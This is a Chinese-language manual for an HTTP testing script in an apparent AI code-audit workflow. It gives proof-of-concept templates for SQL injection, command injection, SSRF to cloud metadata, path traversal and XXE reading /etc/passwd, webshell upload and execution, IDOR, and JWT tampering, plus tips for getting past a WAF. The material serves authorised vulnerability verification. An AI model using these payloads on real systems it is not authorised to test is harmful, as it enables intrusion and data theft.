# http_test.py — vibe-csa Stage 2 发包工具完整用法

## 概述

`http_test.py` 是 vibe-csa Stage 2 动态验证阶段**唯一允许使用的 HTTP 发包工具**。

- 基于 `httpx` 的纯 Python 实现，无外部二进制依赖
- `--show-command` 输出完整请求概览（方法/URL/Headers/Body）→ 直接回填 `poc.steps[].request.raw`
- `--include-headers` 输出完整响应头（状态行+所有 Header）→ 直接回填 `poc.steps[].response.headers`
- `--show-summary` 输出性能指标（DNS/TCP/TLS/TTFB）→ 用于时序盲注证据
- 智能 Body 编码（自动推断 Content-Type、form URL-encode、JSON 序列化）
- 响应体过滤瘦身（`--response-filter` + `--response-max-lines`）→ 只提取证据片段

**依赖**：`pip install httpx charset-normalizer`

**位置**：`{SKILL_ROOT}/scripts/http_test.py`

---

## 快速开始

### 基础 PoC 验证请求

```bash
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL" \
  --method GET \
  --show-command \
  --show-summary \
  --include-headers \
  --response-max-lines 100
```

### POST JSON 数据（PoC payload 发送）

```bash
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_API" \
  --method POST \
  --data '{"key":"value"}' \
  --headers '{"Content-Type":"application/json"}' \
  --show-command \
  --show-summary \
  --include-headers \
  --response-max-lines 100
```

### 带 Cookie 认证的 PoC 验证

```bash
# 先从 workDir/sessions/creds.json 提取 Cookie
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL" \
  --method GET \
  --cookies "PHPSESSID=xxx; token=yyy" \
  --show-command \
  --show-summary \
  --include-headers \
  --response-max-lines 100
```

---

## 代码审计 PoC 验证场景模板

### 场景 1: SQL 注入验证（错误回显检测）

```bash
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL" \
  --method POST \
  --data "id=1'" \
  --headers '{"Content-Type":"application/x-www-form-urlencoded"}' \
  --response-filter '(?i)(error|exception|syntax|mysql|sql|warning|ora-|sqlstate|postgresql|debug|trace|fatal)' \
  --response-filter-mode line \
  --response-context-lines 2 \
  --response-max-lines 40 \
  --show-command \
  --show-summary \
  --include-headers
```

**证据判定**：响应中出现数据库错误关键字 → `poc.evidence` 引用具体行
**对应 evidence_contract**：`EVID_SQL_EXEC_POINT` → 运行时确认

### 场景 2: SQL 注入验证（布尔/时间盲注）

```bash
# 恒真条件
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL?id=1' OR '1'='1" \
  --method GET \
  --show-command --show-summary --include-headers --response-max-lines 30

# 恒假条件（对照）
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL?id=1' OR '1'='2" \
  --method GET \
  --show-command --show-summary --include-headers --response-max-lines 30

# 时间盲注（重复 5 次观察 TTFB）
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL?id=1' AND SLEEP(5)--" \
  --method GET \
  --repeat 5 --delay 0.3 --show-summary --response-max-lines 0
```

### 场景 3: 命令注入/RCE 验证

```bash
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL" \
  --method POST \
  --data "cmd=;id" \
  --response-filter '(?i)(uid=|gid=|groups=)' \
  --response-filter-mode line \
  --response-context-lines 1 \
  --show-command --show-summary --include-headers
```

**证据判定**：响应中出现 `uid=...` → `poc.evidence` 引用命令输出原文
**对应 evidence_contract**：`EVID_RCE_EXEC_POINT` → 运行时确认

### 场景 4: SSRF 内网探测

```bash
# 云元数据探测
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL?url=http://169.254.169.254/latest/meta-data/" \
  --method GET \
  --timeout 5 \
  --response-filter '(?i)(ami-id|instance-id|security-groups|public-keys)' \
  --response-filter-mode line \
  --show-command --show-summary --include-headers

# 内网端口探测
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL?url=http://127.0.0.1:6379/" \
  --method GET \
  --timeout 3 \
  --response-filter '(?i)(redis|connection|refused|timeout|welcome|-ERR)' \
  --show-command --show-summary --include-headers
```

### 场景 5: 路径穿越/LFI 文件读取

```bash
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL/download?file=../../etc/passwd" \
  --method GET \
  --response-filter '(?i)(root:|nobody:|daemon:|bin:.*:/bin/bash)' \
  --response-filter-mode line \
  --response-context-lines 1 \
  --show-command --show-summary --include-headers
```

**证据判定**：响应中出现 `/etc/passwd` 内容 → `poc.evidence` 引用 root/nobody 行
**对应 evidence_contract**：`EVID_FILE_OP_POINT` + `EVID_FILE_NO_PATH_VALIDATION`

### 场景 6: XXE 验证

```bash
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL/api/xml" \
  --method POST \
  --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' \
  --headers '{"Content-Type":"application/xml"}' \
  --response-filter '(?i)(root:|nobody:|daemon:)' \
  --show-command --show-summary --include-headers
```

### 场景 7: 文件上传验证（两步串联）

```bash
# Step 1: 上传 marker 文件
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL/upload" \
  --method POST \
  --data @test_marker.html \
  --headers '{"Content-Type":"multipart/form-data"}' \
  --show-command --show-summary --include-headers

# Step 2: 访问确认 marker
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL/uploads/test_marker.html" \
  --method GET \
  --response-filter 'CSA_MARKER_STRING_12345' \
  --response-filter-mode full \
  --show-command --show-summary --include-headers
```

### 场景 8: 文件上传 → RCE（三步串联）

```bash
# Step 1: 上传 webshell 脚本
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL/upload" \
  --method POST \
  --data @shell.php \
  --show-command --show-summary --include-headers

# Step 2: 访问 webshell 确认存在（无参数 GET）
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL/uploads/shell.php" \
  --method GET \
  --show-command --show-summary --include-headers --response-max-lines 10

# Step 3: 执行命令验证 RCE
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL/uploads/shell.php?cmd=id" \
  --method GET \
  --response-filter '(?i)(uid=|groups=)' \
  --response-filter-mode line \
  --show-command --show-summary --include-headers
```

### 场景 9: 认证绕过/IDOR（A-B 账号跨权限对比）

```bash
# 账号 A 访问自己的资源
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL/api/user/1001/profile" \
  --method GET \
  --cookies "session=COOKIE_USER_A" \
  --show-command --show-summary --include-headers --response-max-lines 80

# 账号 B 用 A 的资源 ID 访问（越权测试）
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL/api/user/1001/profile" \
  --method GET \
  --cookies "session=COOKIE_USER_B" \
  --show-command --show-summary --include-headers --response-max-lines 80
```

### 场景 10: JWT 篡改验证

```bash
# 原 Token 请求（基线）
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL/api/admin" \
  --method GET \
  --headers '{"Authorization":"Bearer ORIGINAL_TOKEN"}' \
  --show-command --show-summary --include-headers

# 篡改 Token 请求（变体）
python {SKILL_ROOT}/scripts/http_test.py \
  --url "TARGET_URL/api/admin" \
  --method GET \
  --headers '{"Authorization":"Bearer TAMPERED_TOKEN"}' \
  --show-command --show-summary --include-headers
```

---

## http_test.py 输出 → finding JSON 字段映射

这是 vibe-csa 最关键的映射关系。每个 http_test.py 调用的输出直接对应 finding 文件的证据字段：

| http_test.py 输出段落 | 对应 finding 字段 | 说明 |
|---|---|---|
| `===== Prepared Request =====` | `poc.steps[].request.raw` | 完整请求概览 |
| `Method: GET/POST/...` | `poc.steps[].request.method` | HTTP 方法 |
| `URL: http://...` | `poc.steps[].request.url` | 完整目标 URL |
| `Headers (N total):` + `Key: Value` | `poc.steps[].request.headers` | 请求头（JSON dict） |
| `Body: N bytes (mode, charset=...)` | `poc.steps[].request.body` | 请求体信息 |
| `===== Response #N =====` | `poc.steps[].response.raw` | 完整响应段落 |
| `HTTP/1.1 200 OK` | `poc.steps[].response.status_code` | 200 |
| 响应头 Key: Value | `poc.steps[].response.headers` | 响应头（JSON dict） |
| `----- Meta #N -----` | `poc.steps[].response._evidence_match[]` | 性能指标/证据级别 |
| `[body] matched N/M lines` | `response._evidence_match[].snippet` | 匹配的响应体片段 |
| `Encoding Used: utf-8 (header)` | `response._evidence_match[].encoding_source` | 编码来源 |
| `[body] no regex match; showing preview:` | `response._evidence_match[].strength=L1` | 未匹配到证据关键词 |

### 回填示例

```json
{
  "poc": {
    "steps": [{
      "name": "SQL注入基线探测",
      "request": {
        "method": "POST",
        "url": "http://target.com/login",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "body": "username=admin' OR '1'='1&password=test",
        "raw": "===== Prepared Request =====\nMethod: POST\nURL: http://target.com/login\n..."
      },
      "response": {
        "status_code": 200,
        "headers": {"Server": "Apache/2.4.65", "X-Powered-By": "PHP/8.1.34"},
        "body": "...",
        "raw": "===== Response #1 =====\nHTTP/1.1 200 OK\n...",
        "_evidence_match": [
          {"type": "regex", "pattern": "(?i)(error|syntax|mysql|sql|warning)", "strength": "L2", "snippet": "  L42: <b>Warning</b>: mysql_fetch_array() expects parameter 1 to be resource..."}
        ]
      }
    }]
  }
}
```

---

## 绕过重试用 http_test.py 特殊参数

当基线 PoC 被拦截/过滤/返回异常时，先回读源码分析原因，再用以下参数组合重试：

| 被拦截原因 | http_test.py 应对参数 |
|---|---|
| WAF/403 拦截 | `--user-agent "Mozilla/5.0" --additional-args "trust_env=false"` |
| 重定向到登录页 | `--follow-redirects --response-filter '(?i)(welcome|dashboard|admin|profile)'` |
| TLS 证书错误 | `--allow-insecure` |
| URL 特殊字符被截断 | `--auto-encode-url` |
| Content-Type 解析差异 | 切换 `--data` 格式（JSON → form → XML） |
| HTTP/2 走私 | `--additional-args "http2=true"` |
| 编码探测 | `--response-encoding gbk` 或 `shift_jis` |
| 大响应截断 | `--download response.bin --response-max-lines 5` |
| 时序盲注 | `--repeat 5 --delay 0.5 --show-summary` |

---

## 常用过滤正则模板（对应漏洞类型）

| 漏洞类型 | 证据过滤正则 |
|---------|------------|
| SQL 注入 | `'(?i)(error\|syntax\|mysql\|sql\|warning\|ora-\|sqlstate\|postgresql\|debug\|trace\|fatal\|exception)'` |
| 命令注入/RCE | `'(?i)(uid=\|gid=\|root:\|daemon:\|bin/bash\|Microsoft Windows\|Linux\|/bin/\|/usr/)'` |
| 命令注入（时间盲注） | 不用 filter，用 `--repeat 5 --delay 0.3 --show-summary` 观察 TTFB |
| SSRF（元数据） | `'(?i)(ami-id\|instance-id\|security-groups\|public-keys\|computeMetadata\|169\.254)'` |
| SSRF（内网探测） | `'(?i)(redis\|connection refused\|timeout\|banner\|-ERR\|+OK\|welcome)'` |
| LFI/路径穿越 | `'(?i)(root:\|<?php\|\[extensions\]\|daemon:\|nobody:\|boot\.ini\|bin/bash)'` |
| XXE | `'(?i)(root:\|daemon:\|nobody:\|DOCTYPE\|ENTITY\|SYSTEM)'` |
| XSS（反射型） | `'<script>'` 或 `'(?i)(alert\|onerror\|onload\|onclick\|eval)'` |
| 信息泄露 | `'(?i)(password\|api_key\|token\|secret\|private\|internal\|admin\|DB_\|DATABASE)'` |
| 模板注入/SSTI | `'(?i)(49\|7777777\|<class\|__class__\|TypeError\|UndefinedError\|TemplateSyntaxError)'` |
| 认证绕过 | `'(?i)(welcome\|dashboard\|admin\|profile\|unauthorized\|forbidden\|login\|redirect\|session)'` |
